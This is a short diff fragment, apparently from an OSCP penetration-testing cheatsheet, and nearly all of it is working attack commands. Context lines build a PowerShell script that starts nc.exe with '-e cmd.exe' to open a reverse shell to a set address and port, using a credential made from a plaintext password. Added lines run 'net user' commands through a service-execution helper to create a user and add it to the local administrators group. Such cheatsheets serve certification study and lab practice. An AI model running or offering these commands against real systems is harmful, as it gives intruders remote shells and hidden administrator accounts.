@@ -4,6 +4,8 @@ echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> s
 echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
 echo Start-Process "C:\Users\public\nc.exe" -ArgumentList "-e cmd.exe 192.168.119.213 1234"  -Credential $credential >> startprocess.ps1
 
+    service_exec(conn, r'cmd /c net user bill pass /add')
+    service_exec(conn, r'cmd /c net localgroup administrators bill /add') 
 
 # OSCP Cheatsheet
 
